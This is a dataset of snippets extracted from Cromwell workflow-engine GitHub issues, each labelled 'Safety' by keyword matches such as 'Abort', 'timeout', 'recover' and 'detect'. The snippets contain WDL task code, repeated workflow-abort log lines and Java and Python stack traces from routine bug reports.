Safety,"3d1cb48973da7f646a7de2 > /sandbox/users/foucal-a/test_atac-pipe/cromwell-executions/atac/f4fd93fa-6f3a-42a6-94f2-459901d245c4/call-trim_adapter/shard-0/execution/glob-4f26c666d13d1cb48973da7f646a7de2.list; ```; I have the error when the script tries to symlink all the files into the glob directory.; Here is the WDL code : ; ```; scatter( i in range(length(fastqs_)) ) {; # trim adapters and merge trimmed fastqs; call trim_adapter { input :; fastqs = fastqs_[i],; adapters = if length(adapters_)>0 then adapters_[i] else [],; paired_end = paired_end,; }; # align trimmed/merged fastqs with bowtie2s; call bowtie2 { input :; idx_tar = bowtie2_idx_tar,; fastqs = trim_adapter.trimmed_merged_fastqs, #[R1,R2]; paired_end = paired_end,; multimapping = multimapping,; }; }; ```; With the function :; ```; task trim_adapter { # trim adapters and merge trimmed fastqs; # parameters from workflow; Array[Array[File]] fastqs # [merge_id][read_end_id]; Array[Array[String]] adapters # [merge_id][read_end_id]; Boolean paired_end; # mandatory; Boolean? auto_detect_adapter # automatically detect/trim adapters; # optional; Int? min_trim_len # minimum trim length for cutadapt -m; Float? err_rate # Maximum allowed adapter error rate; # for cutadapt -e; # resource; Int? cpu; Int? mem_mb; Int? time_hr; #Commenting this line as a test. PRoblem with hard link; String? disks. command {; python $(which encode_trim_adapter.py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ${if paired_end then ""--paired-end"" else """"} \; ${if select_first([auto_detect_adapter,false]) then ""--auto-detect-adapter"" else """"} \; ${""--min-trim-len "" + select_first([min_trim_len,5])} \; ${""--err-rate "" + select_first([err_rate,'0.1'])} \; ${""--nth "" + select_first([cpu,2])}; }; output {; # WDL glob() globs in an alphabetical order; # so R1 and R2 can be switched, which results in an; # unexpected behavior of a workflow; # so we prepend merge_fastqs_'end'_ (R1 or R2); # to the basename of original filename; # t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3876:2750,detect,detect,2750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3876,1,['detect'],['detect']
Safety,"40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1438,Abort,Abort,1438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,48:00 cromwell-system-akka.dispatchers.backend-dispatcher-84 ERROR - GcpBatchAsyncBackendJobExecutionActor [UUID(119e11a5)wf_hello.hello:NA:1]: Error attempting to Recover(StandardAsyncJob(projects/broad-dsde-cromwell-dev/locations/us-central1/jobs/job-7ce25791-3731-4a69-97f1-b7b65ac8ff71)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecuti,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:2932,recover,recover,2932,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,"4:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2045,Abort,Abort,2045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2197,Abort,Abort,2197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2804,Abort,Abort,2804,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3411,Abort,Abort,3411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3715,Abort,Abort,3715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:14675,timeout,timeout,14675,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; java.lang.Exception: Task m2.Mutect2.M2:1:1 failed. J",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:8155,timeout,timeout,8155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n); gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DN",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:11488,timeout,timeout,11488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"5:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3867,Abort,Abort,3867,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"5:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 